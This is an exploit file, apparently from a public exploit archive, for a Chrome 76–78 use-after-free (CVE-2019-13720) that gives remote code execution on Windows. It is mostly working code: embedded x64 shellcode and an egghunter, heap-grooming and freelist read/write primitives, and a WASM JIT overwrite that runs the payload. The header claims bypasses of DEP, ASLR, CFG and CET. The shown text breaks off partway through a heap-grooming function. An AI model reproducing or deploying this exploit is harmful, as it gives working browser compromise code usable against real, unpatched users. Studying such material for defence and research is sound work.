# Exploit Title: Google Chrome 78.0.3904.70 - Remote Code Execution
# Date: 2022-05-03
# Exploit Author: deadlock (Forrest Orr)
# Type: RCE
# Platform: Windows
# Website: https://forrest-orr.net
# Twitter: https://twitter.com/_ForrestOrr
# Vendor Homepage: https://www.google.com/chrome/
# Software Link: https://github.com/forrest-orr/WizardOpium/blob/main/Google_Chrome_Portable_64bit_v76.0.3809.132.zip
# Versions: Chrome 76 - 78.0.3904.70
# Tested on: Chrome 76.0.3809.132 Official Build 64-bit on Windows 10 x64
# CVE: CVE-2019-13720
# Bypasses: DEP, High Entropy ASLR, CFG, CET
# Github: https://github.com/forrest-orr/WizardOpium

<html>
<script>
/*;; --------------------------------------------------------------------- |
;;;; Google Chrome Use After Free - CVE-2019-13720 - Wizard Opium          |
;;;; --------------------------------------------------------------------- |
;;;; Author: deadlock (Forrest Orr) - 2022                                 |
;;;; --------------------------------------------------------------------- |
;;;; Licensed under GNU GPLv3                                              |
;;;; --------------------------------------------------------------------- |
;;;; Tested with Chrome 76.0.3809.132 Official Build 64-bit on Windows 10  |
;;;; 64-bit with CPU core counts:                                          |
;;;;   ~ 16 cores (non-virtualized) | works                                |
;;;;   ~ 4 cores (virtualized)      | works                                |
;;;;   ~ 2 cores (virtualized)      | works                                |
;;;;   ~ 1 core (virtualized)       | fails                                |
;;;;                                                                       |
;;;; All of these tests finished successfully with a 95%+ success rate     |
;;;; with the exception of the 1 core tests, which fail with a 100%        |
;;;; frequency. Due to the nature of the exploit as both a UAF highly      |
;;;; sensitive to the state of the heap and a race condition, it appears   |
;;;; that a single core is unable to reliably reproduce the UAF or any     |
;;;; kind of consistency in the heap between executions.                   |
;;;; --------------------------------------------------------------------- |
;;;; Bypasses: DEP, High Entropy ASLR, CFG, CET                            |
;;;; --------------------------------------------------------------------- |
;;;; ## Sandboxing                                                         |
;;;;  ~ Chrome uses an isolated content child proces running under a       |
;;;;    restricted token below Low Integrity to render JavaScript.         |
;;;;  ~ Child process creation is restricted via Windows exploit           |
;;;;    mitigation features on the OS level for Chrome renderers.          |
;;;;  ~ The original WizardOpium chain used a win32k LPE exploit as a      |
;;;;    sandbox escape (this was limited to Windows 7 since in newer       |
;;;;    versions of Windows win32k syscalls are locked in Chrome for       |
;;;;    security purposes).                                                |
;;;;  ~ Run Chrome with the "--no-sandbox" parameter in order to execute   |
;;;;    the WinExec shellcode within this exploit source.                  |
;;;; --------------------------------------------------------------------- |
;;;; ## Notes                                                              |
;;;;  ~ This UAF targets the PartitionAlloc heap and abuses the freelist   |
;;;;    for both infoleaks and R/W primitives.                             |
;;;;  ~ The exploit should in theory work in any version of Chrome up to   |
;;;;    78.0.3904.87 but has only been tested on 76.0.3809.132.            |
;;;;  ~ WASM JIT/egghunter design for code execution: a WASM module is     |
;;;;    initialized resulting in the creation of a single page of +RWX     |
;;;;    JIT memory. This is then overwritten with a 673 byte egghunter     |
;;;;    shellcode.                                                         |
;;;;  ~ The egghunter will scan through all committed +RW regions of       |
;;;;    private memory within the compromised chrome.exe renderer process  |
;;;;    and mark any region it identifies as +RWX which contains the egg   |
;;;;    QWORD bytes and subsequentially execute it via a CALL instruction. |
;;;;  ~ Shellcode used within this exploit should be encoded as a Uint8    |
;;;;    array prefixed by the following egg QWORD bytes:                   |
;;;;    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88                     |
;;;; --------------------------------------------------------------------- |
;;;; ## Credits                                                            |
;;;;  ~ Kaspersky for identifying and analyzing the WizardOpium exploit    |
;;;;    chain in the wild.                                                 |
;;;; -------------------------------------------------------------------- */

const Shellcode = new Uint8Array([ 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x90, 0x48, 0xc7, 0xc1, 0x88, 0x4e, 0x0d, 0x00, 0x90, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x90, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xea, 0x6f, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0xa1, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x51, 0x48, 0xb9, 0x57, 0x53, 0x5c, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x51, 0x48, 0xb9, 0x43, 0x3a, 0x5c, 0x57, 0x49, 0x4e, 0x44, 0x4f, 0x51, 0x48, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x41, 0x50, 0x57, 0x56, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0xc6, 0x60, 0x00, 0x00, 0x00, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x30, 0x48, 0x89, 0xfe, 0x48, 0x31, 0xc0, 0xeb, 0x05, 0x48, 0x39, 0xf7, 0x74, 0x34, 0x48, 0x85, 0xf6, 0x74, 0x2f, 0x48, 0x8d, 0x5e, 0x38, 0x48, 0x85, 0xdb, 0x74, 0x1a, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0xe8, 0xae, 0x01, 0x00, 0x00, 0x4c, 0x39, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0x8b, 0x36, 0xeb, 0xcb, 0x48, 0x8b, 0x46, 0x10, 0x5e, 0x5f, 0x41, 0x58, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xd9, 0x48, 0x83, 0xc1, 0x18, 0x48, 0x8b, 0x75, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x70, 0x48, 0x01, 0xde, 0x48, 0x89, 0x75, 0xe8, 0x8b, 0x41, 0x74, 0x89, 0x45, 0xc0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x20, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x5e, 0x24, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x1c, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x31, 0xf6, 0x48, 0x89, 0x75, 0xc8, 0x48, 0x8b, 0x45, 0xe8, 0x8b, 0x40, 0x18, 0x48, 0x39, 0xf0, 0x0f, 0x86, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xc1, 0xe8, 0xf7, 0x00, 0x00, 0x00, 0x3b, 0x45, 0xf0, 0x0f, 0x85, 0xda, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x14, 0x00, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x0f, 0xb7, 0x04, 0x02, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xd0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xc8, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x89, 0xca, 0x48, 0x31, 0xdb, 0x8b, 0x5d, 0xc0, 0x48, 0x01, 0xda, 0x48, 0x39, 0xc8, 0x0f, 0x8c, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x39, 0xd0, 0x0f, 0x8d, 0x97, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfd, 0xff, 0xff, 0x8a, 0x14, 0x08, 0x80, 0xfa, 0x00, 0x74, 0x2f, 0x80, 0xfa, 0x2e, 0x75, 0x20, 0xc7, 0x03, 0x2e, 0x64, 0x6c, 0x6c, 0x48, 0x83, 0xc3, 0x04, 0xc6, 0x03, 0x00, 0xeb, 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc1, 0xeb, 0xd3, 0x88, 0x13, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc3, 0xeb, 0xc9, 0xc6, 0x03, 0x00, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfd, 0xff, 0xff, 0xe8, 0x46, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0x47, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x2e, 0x48, 0x89, 0x45, 0xb8, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfe, 0xff, 0xff, 0xe8, 0x26, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2, 0x48, 0x8b, 0x4d, 0xb8, 0xe8, 0x82, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0xeb, 0x09, 0x48, 0xff, 0xc6, 0x90, 0xe9, 0xe0, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x45, 0xc8, 0x5e, 0x5f, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x57, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xdb, 0x80, 0x39, 0x00, 0x74, 0x1a, 0x0f, 0xb6, 0x01, 0x0c, 0x60, 0x0f, 0xb6, 0xd0, 0x01, 0xd3, 0x48, 0xd1, 0xe3, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xff, 0x74, 0xe6, 0x48, 0xff, 0xc1, 0xeb, 0xe1, 0x48, 0x89, 0xd8, 0x5f, 0xc3,  ]);
const Egghunter = new Uint8Array([ 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x40, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x48, 0xc7, 0xc1, 0x88, 0x4e, 0x0d, 0x00, 0xe8, 0x21, 0x01, 0x00, 0x00, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xd2, 0x33, 0x0e, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0x6e, 0x01, 0x00, 0x00, 0x49, 0x89, 0xc5, 0x4d, 0x31, 0xe4, 0x4d, 0x31, 0xf6, 0x4d, 0x31, 0xff, 0x4d, 0x85, 0xff, 0x0f, 0x85, 0xf5, 0x00, 0x00, 0x00, 0x4d, 0x01, 0xf4, 0x49, 0xc7, 0xc0, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xd0, 0x4c, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x41, 0xff, 0xd5, 0x48, 0x89, 0xec, 0x5d, 0x48, 0x83, 0xf8, 0x30, 0x0f, 0x85, 0xc3, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x45, 0xd0, 0x4c, 0x8b, 0x70, 0x18, 0x4c, 0x8b, 0x20, 0x81, 0x78, 0x28, 0x00, 0x00, 0x02, 0x00, 0x75, 0xb1, 0x81, 0x78, 0x20, 0x00, 0x10, 0x00, 0x00, 0x75, 0xa8, 0x83, 0x78, 0x24, 0x04, 0x75, 0xa2, 0x4c, 0x89, 0xf1, 0x48, 0x83, 0xe9, 0x08, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x48, 0xbb, 0x10, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0xff, 0xc3, 0x48, 0xff, 0xc2, 0x48, 0x39, 0xca, 0x7d, 0x80, 0x49, 0x39, 0x1c, 0x14, 0x74, 0x02, 0xeb, 0xf0, 0x4d, 0x8d, 0x3c, 0x14, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x08, 0x00, 0x00, 0x00, 0x49, 0x39, 0xc7, 0x7f, 0x13, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x10, 0x00, 0x00, 0x00, 0x49, 0x39, 0xc7, 0x7c, 0x05, 0x4d, 0x31, 0xff, 0xeb, 0xcb, 0x48, 0x31, 0xc9, 0x49, 0x89, 0x0c, 0x14, 0x48, 0xc7, 0xc2, 0x3c, 0xd1, 0x38, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0x9f, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4d, 0xc0, 0x49, 0xc7, 0xc0, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xd0, 0x48, 0x8b, 0x52, 0x18, 0x4c, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0x49, 0x83, 0xc7, 0x08, 0x41, 0xff, 0xd7, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x41, 0x50, 0x57, 0x56, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0xc6, 0x60, 0x00, 0x00, 0x00, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x30, 0x48, 0x89, 0xfe, 0x48, 0x31, 0xc0, 0xeb, 0x05, 0x48, 0x39, 0xf7, 0x74, 0x34, 0x48, 0x85, 0xf6, 0x74, 0x2f, 0x48, 0x8d, 0x5e, 0x38, 0x48, 0x85, 0xdb, 0x74, 0x1a, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0xe8, 0x18, 0x01, 0x00, 0x00, 0x4c, 0x39, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0x8b, 0x36, 0xeb, 0xcb, 0x48, 0x8b, 0x46, 0x10, 0x5e, 0x5f, 0x41, 0x58, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xd9, 0x48, 0x83, 0xc1, 0x18, 0x48, 0x8b, 0x75, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x70, 0x48, 0x01, 0xde, 0x48, 0x89, 0x75, 0xe8, 0x8b, 0x41, 0x74, 0x89, 0x45, 0xc0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x20, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x5e, 0x24, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x1c, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x31, 0xf6, 0x48, 0x89, 0x75, 0xc8, 0x48, 0x8b, 0x45, 0xe8, 0x8b, 0x40, 0x18, 0x48, 0x39, 0xf0, 0x76, 0x7e, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xc1, 0xe8, 0x65, 0x00, 0x00, 0x00, 0x3b, 0x45, 0xf0, 0x75, 0x4c, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x14, 0x00, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x0f, 0xb7, 0x04, 0x02, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xd0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xc8, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x89, 0xca, 0x48, 0x31, 0xdb, 0x8b, 0x5d, 0xc0, 0x48, 0x01, 0xda, 0x48, 0x39, 0xc8, 0x7c, 0x16, 0x48, 0x39, 0xd0, 0x7d, 0x11, 0x48, 0xc7, 0x45, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xff, 0xc6, 0x90, 0xe9, 0x76, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x45, 0xc8, 0x5e, 0x5f, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x57, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xdb, 0x80, 0x39, 0x00, 0x74, 0x1a, 0x0f, 0xb6, 0x01, 0x0c, 0x60, 0x0f, 0xb6, 0xd0, 0x01, 0xd3, 0x48, 0xd1, 0xe3, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xff, 0x74, 0xe6, 0x48, 0xff, 0xc1, 0xeb, 0xe1, 0x48, 0x89, 0xd8, 0x5f, 0xc3,  ]);
let DebugEgg = 0xeeeeeeee; // Used to create a magic QWORD to locate FastMalloc Extent/Super Pages in memory.
let GcPreventer = [];
let IIRFilters = [];
var SharedAudioCtx = undefined;
let FeedforwardSuperPageMetadata = undefined;
let OutputFloatArray = new Float32Array(10);
let MutableFreeListAudioBufs = [];
let DoubleAllocAudioBufs = [];
let ImageDataArray = [];
const EnableDebug = true;
const AlertOutput = false;
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);
var HelperBigInt = new BigUint64Array(HelperBuf);
var HelperUint8 = new Uint8Array(HelperBuf);

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

function Sleep(delay) {
    return new Promise(resolve => setTimeout(resolve, delay))
}

function ReverseBigInt(Val) {
    let ReversedVal = BigInt(0);
    let TempVal = Val;

    for (let i = 0; i < 8; i++) {
        ReversedVal = ReversedVal << BigInt(8);
        ReversedVal += TempVal & BigInt(0xFF);
        TempVal = TempVal >> BigInt(8);
    }

    return ReversedVal;
}

function ClearBigIntLow21(Val) {
    let BitMask = (BigInt(1) << BigInt(21)) - BigInt(1); // 0000000000000000000000000000000000000000000111111111111111111111
    let ClearedVal = Val & ~BitMask; // 1111111111111111111111111111111111111111111000000000000000000000
    return ClearedVal;
}

let GetSuperPageBase = ClearBigIntLow21;

function GetSuperPageMetadata(LeakedPtr) {
    let SuperPageBase = GetSuperPageBase(LeakedPtr);
    return SuperPageBase + BigInt(0x1000); // Front and end Partition Pages of Super Page are Guard Pagees, with the exception of a single System Page at offset 0x1000 (second System Page) of the front end Partition Page
}

function GetPartitionPageIndex(LeakedPtr) {
    let Low21Mask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let Index = (LeakedPtr & Low21Mask) >> BigInt(14);
    return Index;
}


function GetPartitionPageMetadata(LeakedPtr) {
    let Index = GetPartitionPageIndex(LeakedPtr);
    let partitionPageMetadataPtr = GetSuperPageMetadata(LeakedPtr) + (Index * BigInt(0x20));
    return partitionPageMetadataPtr;
}

function GetPartitionPageBase(LeakedPtr, Index) {
    let SuperPageBase = GetSuperPageBase(LeakedPtr);
    let PartitionPageBase = SuperPageBase + (Index << BigInt(14));
    return PartitionPageBase;
}

function GC() {
    let MyPromise = new Promise(function(GcCallback) {
        let Arg;
        
        for (var i = 0; i < 400; i++) {
            new ArrayBuffer(1024 * 1024 * 60).buffer;
        }
        
        GcCallback(Arg);
    });
    
    return MyPromise;
}

/*
chrome_child!WTF::ArrayBufferContents::AllocateMemoryWithFlags+0xcf:
00007ffa`cc086513 488b0e          mov     rcx,qword ptr [rsi] ds:00007ffe`0fc70000=????????????????
*/

function LeakQword(FreeListHead, TargetAddress) {
    FreeListHead[0] = TargetAddress;
    let TempVal = new BigUint64Array;
    TempVal.buffer;
    GcPreventer.push(TempVal);
    return ReverseBigInt(FreeListHead[0]);
}
 
function WriteQword(FreeListHead, TargetAddress, Val) {
    FreeListHead[0] = TargetAddress;
    let TempVal = new BigUint64Array(1);
    TempVal.buffer;
    TempVal[0] = Val;
    GcPreventer.push(TempVal);
}

function CreateWasmJITExport() {
    /*
    After this function returns, a new region of memory will appear with a
    single system page of 0x1000 bytes set to RWX for the JIT region for
    this WASM module
    
    0x00000ACDB6790000:0x40000000   | Private
        0x00000ACDB6790000:0x00001000 | RX       | 0x00000000 | Abnormal private executable memory
        0x00000ACDB6791000:0x00001000 | RWX      | 0x00000000 | Abnormal private executable memory
    */
    
    var ImportObj = { imports: { imported_func: arg => console.log(arg) } };
    const WasmModuleBytes = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
    const WasmCode = new Uint8Array(WasmModuleBytes);
    const WasmModule = new WebAssembly.Instance(new WebAssembly.Module(WasmCode), ImportObj);
    return WasmModule.exports.exported_func;
}

/*
struct __attribute__((packed)) SlotSpanMetadata {
  unsigned long freelist_head;
  unsigned long next_slot_span;
  unsigned long bucket;
  uint32_t marked_full : 1;
  uint32_t num_allocated_slots : 13;
  uint32_t num_unprovisioned_slots : 13;
  uint32_t can_store_raw_size : 1;
  uint32_t freelist_is_sorted : 1;
  uint32_t unused1 : (32 - 1 - 2 * 13 - 1 - 1);
  uint16_t in_empty_cache : 1;
  uint16_t empty_cache_index : 7;
  uint16_t unused2 : (16 - 1 - 7);
};

struct PartitionPage {
  union {
    struct SlotSpanMetadata span;
    size_t raw_size;
    struct PartitionSuperPageExtentEntry head;
    struct {
      char pad[32 - sizeof(uint16_t)];
      uint16_t slot_span_metadata_offset;
    };
  };
};

struct PartitionBucket {
  unsigned long active_slot_spans_head;
  unsigned long empty_slot_spans_head;
  unsigned long decommitted_slot_spans_head;
  uint32_t slot_size;
  uint32_t num_system_pages_per_slot_span : 8;
  uint32_t num_full_slot_spans : 24;
};
*/

function HuntSlotSpanHead(FreeListHead, SlotSize, SuperPageMetadataBase) {
    for(var SpanIndex = 0; SpanIndex < 128; SpanIndex++) {
        SlotSpanMetaAddress = BigInt(SuperPageMetadataBase) + BigInt((SpanIndex * 0x20) + 0x20 + 0x10); // Always an extra 0x20 to account for start of SuperPage struct
        HelperBigInt[0] = SlotSpanMetaAddress;
        DebugLog("... targetting slot span metadata at " + HelperDword[1].toString(16) + HelperDword[0].toString(16) + " for slot span " + SpanIndex.toString(10));
        BucketAddress = LeakQword(FreeListHead, SlotSpanMetaAddress);
        HelperBigInt[0] = BucketAddress;
        DebugLog("... leaked bucket address of " + HelperDword[1].toString(16) + HelperDword[0].toString(16) + " for slot span " + SpanIndex.toString(10));
        
        if(BucketAddress != BigInt(0)) {
            BucketAddress = BucketAddress + BigInt(0x18); // PartitionBucket.slot_size
            BucketSize = LeakQword(FreeListHead, BucketAddress);
            HelperBigInt[0] = BucketSize;
            DebugLog("... leaked bucket size is " + HelperDword[1].toString(16) + " " + HelperDword[0].toString(16) + " for slot span " + SpanIndex.toString(10));
            
            if(HelperDword[0] == SlotSize) {
                DebugLog("... found desired slot size! Reading freelist head for SlotSpan...");
                SlotSpanFreeListAddress = BigInt(SuperPageMetadataBase) + BigInt((SpanIndex * 0x20) + 0x20); // Always an extra 0x20 to account for start of SuperPage struct
                HelperBigInt[0] = LeakQword(FreeListHead, SlotSpanFreeListAddress);
                DebugLog("... leaked slot span freelist address of " + HelperDword[1].toString(16) + HelperDword[0].toString(16) + " for slot span " + SpanIndex.toString(10));
                return HelperBigInt[0];
            }
        }
    }
}

function ExecutePayload(FreeListHead) {
    var WasmExport = CreateWasmJITExport();
    let FileReaderObj = new FileReader;
    let FileReaderLoaderSize = 0x140; // Literal size is 0x128, 0x140 is the bucket size post-alignment
    
    DebugLog("... WASM module and FileReader created.");
    FileReaderObj.onerror = WasmExport;
    let FileReaderLoaderPtr = HuntSlotSpanHead(FreeListHead, FileReaderLoaderSize, FeedforwardSuperPageMetadata);

    if (!FileReaderLoaderPtr) {
        DebugLog("... failed to obtain free list head for bucket size 0x140 slot span");
        return;
    }
     
    HelperBigInt[0] = FileReaderLoaderPtr;
    DebugLog("... estimated a FileReaderLoader alloc address of " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    FileReaderObj.readAsArrayBuffer(new Blob([])); // It is not the blob causing the allocation: FileReaderLoader itself as a class is allocated into the FastMalloc Extent
    let ValidationPtr = HuntSlotSpanHead(FreeListHead, FileReaderLoaderSize, FeedforwardSuperPageMetadata);
    
    if(ValidationPtr != FileReaderLoaderPtr) {
        HelperBigInt[0] = ValidationPtr;
        DebugLog("... successfully validated re-claim of FileReaderLoader slot (free list head for slot span has been re-claimed) at " + HelperDword[1].toString(16) + HelperDword[0].toString(16));

        let FileReaderPtr = LeakQword(FreeListHead, FileReaderLoaderPtr + BigInt(0x10)) - BigInt(0x68);
        let VectorPtr = LeakQword(FreeListHead, FileReaderPtr + BigInt(0x28));
        let RegisteredEventListenerPtr = LeakQword(FreeListHead, VectorPtr);
        let EventListenerPtr = LeakQword(FreeListHead, RegisteredEventListenerPtr);
        let EventHandlerPtr = LeakQword(FreeListHead, EventListenerPtr + BigInt(0x8));
        let JsFuncObjPtr = LeakQword(FreeListHead, EventHandlerPtr + BigInt(0x8));
        let JsFuncPtr = LeakQword(FreeListHead, JsFuncObjPtr) - BigInt(1);
        let SharedFuncInfoPtr = LeakQword(FreeListHead, JsFuncPtr + BigInt(0x18)) - BigInt(1);
        let WasmExportedFunctDataPtr = LeakQword(FreeListHead, SharedFuncInfoPtr + BigInt(0x8)) - BigInt(1);
        let WasmInstancePtr = LeakQword(FreeListHead, WasmExportedFunctDataPtr + BigInt(0x10)) - BigInt(1);
        let StubAddrFieldOffset = undefined;

        switch (MajorVersion) {
            case 77:
                StubAddrFieldOffset = BigInt(0x8) * BigInt(16);
                break;
            case 76:
                StubAddrFieldOffset = BigInt(0x8) * BigInt(17);
                break
        }
        
        let RwxJitStubPtr = LeakQword(FreeListHead, WasmInstancePtr + StubAddrFieldOffset);
        HelperBigInt[0] = RwxJitStubPtr;
        DebugLog("... resolved JIT stub address of " + HelperDword[1].toString(16) + HelperDword[0].toString(16));

        for(var x = 0; x < Egghunter.length; x += 8) {
            JitChunkAddress = RwxJitStubPtr + BigInt(x);
            HelperBigInt[0] = JitChunkAddress;
            //DebugLog("... writing chunk of egghunter shellcode at offset " + x.toString(10) + " to JIT region at " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            
            for(var y = 0; y < 8; y++) {
                HelperUint8[y] = Egghunter[x + y];
            }
            
            WriteQword(FreeListHead, JitChunkAddress, HelperBigInt[0]);
        }
        
        HelperBigInt[0] = RwxJitStubPtr;
        DebugLog("... executing shellcode at " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        WasmExport();
    }
    else {
        DebugLog("... failed to validate re-claim of FileReaderLoader slot at " + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    }
}

async function PrePayloadHeapGroom() {
    DebugLog("... grooming heap in preparation for R/W primitive creation and payload execution...");
    await GC();
    DoubleAllocAudioBufs = []; // These were the "holders" making sure Chrome itself didn't re-claim feedforward up until this point. Now free and immediately re-claim them, once again as audio buffers. 

    for (var j = 0; j < 80; j++) {
        MutableFreeListAudioBufs.push(SharedAudioCtx.createBuffer(1, 2, 10000));
    }

    // At this stage, feedforward is double allocated. Once as a feedforward or IIRFilters, and once as an audio buffer. Here we are putting it into double use, wherein as a feedforward it will now be (truly) free (and in the freelist), while in the other it is a committed/allocated audio buffer we can R/W.
    
    IIRFilters = new Array(1);
    await GC();

    for (var j = 0; j < 336; j++) {
        ImageDataArray.push(new ImageData(1, 2));
    }
    
    ImageDataArray = new Array(10);
    await GC();

